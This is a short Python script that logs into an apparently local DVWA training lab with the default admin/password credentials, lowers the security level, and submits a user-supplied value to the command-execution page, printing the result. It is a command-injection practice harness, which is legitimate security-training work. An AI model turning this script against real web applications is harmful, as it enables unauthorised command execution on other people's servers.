import requests
import sys
from bs4 import BeautifulSoup

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Please write url")
        exit(0)

    url = 'http://localhost:81/'

    # Auth
    session = requests.Session()
    res = session.get(url + 'login.php')
    soup = BeautifulSoup(res.content, features="html.parser")
    result = soup.find('input', {'name': 'user_token'})
    token = result['value']

    data = {
        'username': 'admin',
        'password': 'password',
        'Login': 'Login',
        'user_token': token,
    }
    resp = session.post(url + 'login.php', data=data)

    # Change security
    data = {
        'security': 'low',
        'seclev_submit': 'Submit',
        'user_token': token,
    }
    session.post(url + 'security.php', data=data)

    # Send ping
    data = {
        'ip': sys.argv[1],
        'Submit': 'Submit',
        'user_token': token,
    }
    res = session.post(url + 'vulnerabilities/exec/', data=data)
    soup = BeautifulSoup(res.content, features="html.parser")
    result = soup.find('pre')
    print(result.text)

